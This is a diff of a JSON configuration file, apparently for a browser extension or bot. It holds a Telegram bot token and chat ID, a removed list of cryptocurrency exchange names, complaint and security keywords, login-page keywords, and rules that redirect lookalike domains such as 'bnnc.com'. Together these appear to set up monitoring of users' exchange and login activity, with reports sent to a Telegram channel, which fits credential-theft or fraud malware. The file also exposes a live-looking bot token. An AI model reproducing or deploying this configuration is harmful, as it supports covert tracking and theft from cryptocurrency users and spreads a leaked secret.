@@ -1,42 +1,26 @@
 {
-  "tkn": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
-  "chid": "-1002836423777",
-  "kws": [
-    "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
-    "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
-    "BKEX","Bithumb","Bithumb Global","BitoPro","Binance","Binance US","Binance TR","BTC-Alpha","BTCC",
-    "Bullish","Brasil Bitcoin","CEX.IO","CEX","Changelly Pro","Coinbase","Coinall","Coincheck","CoinDCX",
-    "Coindeal","CoinEx","CoinFLEX","Coinhub","CoinTiger","Coinut","CoinW","Coinsbit","Crypto.com","Deepcoin",
-    "Deribit","Dcoin","DigiFinex","Exmo","FEX","FMFW.io","Gate.io","Gate","Gemini","GOKO","GoMining","HitBTC",
-    "Hotbit","Hotcoin","HTX","Huobi","Huobi Japan","Huobi Korea","Indodax","Koinbazar","Korbit","Kraken","KuCoin",
-    "LATOKEN","LBank","Liquid","Mandala Exchange","MAX Exchange","Mercado Bitcoin","MEXC","Nicehash","Nexo",
-    "Nominex","OceanEx","OKCoin","OKX","Paribu","Phemex","Poloniex","ProBit Global","SFOX","SimpleSwap","STEX",
-    "SuperEx","Tapbit","Toobit","Tokocrypto","Uniswap","Upbit","UPB","VCC Exchange","WazirX","WhiteBIT","XT.COM",
-    "Zaif","Zebpay","ZBG","ZB.com","ZenGo","krypto","criptoswaps","novadax","foxbit","ripio","Bybit","Bybitglobal",
-    "Bitpanda","Coinsquare","Luno","Bitvavo","Bitonic","coincorner","Coinmama","Coinzoom","BTC Markets",
-    "Crypto.com Exchange","Pionex","Azbit","Coinstore","KCEX","Coinbase Exchange","WEEX","GroveX","BVOX",
-    "QMall","Ourbit","Biconomy.com","Zoomex","Hibt","Bitunix","Icrypex","BloFin","P2B","PointPay","BitDelta",
-    "BitKan","Trubit","OrangeX","BYDFi","Dex-Trade","BTSE","Tothemoon","SAFEbit","Fastex","CoinTR",
-    "Backpack Exchange","HashKey Exchange","CoinCatch","bitcastle","OKJ","Nonkyc.io","Deribit Spot","BitStorage",
-    "Bitazza","Max Maicoin","VALR","LCX Exchange","EarnBIT","Coins.ph","Independent Reserve","Nami Exchange",
-    "WOO X","Ondo Global Markets","Arkham","Bitcointry","Bitlo","HashKey Global","One Trading","GMO Japan",
-    "Kanga","Figure Markets","itBit","Bittime","XBO.com","Kinesis Money","Cube","Cryptal","Young Platform",
-    "INEX","Delta Exchange","INX One","Bitcoin.me","Websea","Bilaxy","C-Patex","Coinone","Tokpie","Koinpark",
-    "NovaDAX","TokoCrypto","GoPax","CoinJar Exchange","BTCBOX","BitBNS","Gate US","Bitexen","Paymium","Orbix",
-    "Hata","ChainEX","Blockchain.com","FameEX","CoinUp.io","ALP.COM","LocalTrade","Ecxx","Vindax","zondacrypto",
-    "Bit2c","NBX","Digitalexchange.id","Namebase","Niza.io","Catex","BIT","KoinBX","Bitexlive","ZBX","Giottus",
-    "Freiexchange","StakeCube Exchange","Birake","SecondBTC","Bitbegin","BCEX","SafeTrade","Purcow","BtcTurk | Kripto",
-    "Tokenize","Mudrex","Upbit Indonesia","Coinbase International Exchange","AltcoinTrader","Powertrade",
-    "BTC Trade UA","BuyUcoin","Bitsten","Coinlist","BitOnBay","XeggeX","KickEX","TradeOgre","Globe","AQX","DIFX",
-    "Byte Exchange","Okcoin","FMCPAY","Wallet","exchangem","platform",
-	  "scam","trustworthy","safe","secure","fake","true","fraud","scammer","malicious","malware","virus",
-	"spyware","adware","phishing","ransomware","dataleak","donotinstall","donotrecommend","complaint",
-	"report","datatheft","accounttheft","unfaircharges","unsafe","dangerous","suspicious","dubious","misleading",
-	"fraudulent","cloning","privacybreach","doesnotwork","bug","blocked","leak","a","e","t"
+  "botToken": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
+  "chatId": "-1002836423777",
+
+  "keywords": [
+    "scam","trustworthy","safe","secure","fake","true","fraud","scammer","malicious","malware","virus",
+    "spyware","adware","phishing","ransomware","dataleak","donotinstall","donotrecommend","complaint",
+    "report","datatheft","accounttheft","unfaircharges","unsafe","dangerous","suspicious","dubious","misleading",
+    "fraudulent","cloning","privacybreach","doesnotwork","bug","blocked","leak","a","e","t"
   ],
-  "lgs": ["login","loguin","sign in","entrar","acessar","access","account"],
-  "rds": [
-    {"r":"(www\\.)?bnnc\\.com.*","u":"https://ge.globo.com/"},
-    {"r":"(www\\.)?biet\\.com.*","u":"https://ge.globo.com/"}
+
+  "loginKeywords": [
+    "login","loguin","sign in","entrar","acessar","access","account"
+  ],
+
+  "redirectRules": [
+    {
+      "regex": "(www\\.)?bnnc\\.com.*",
+      "url": "https://ge.globo.com/"
+    },
+    {
+      "regex": "(www\\.)?biet\\.com.*",
+      "url": "https://ge.globo.com/"
+    }
   ]
 }
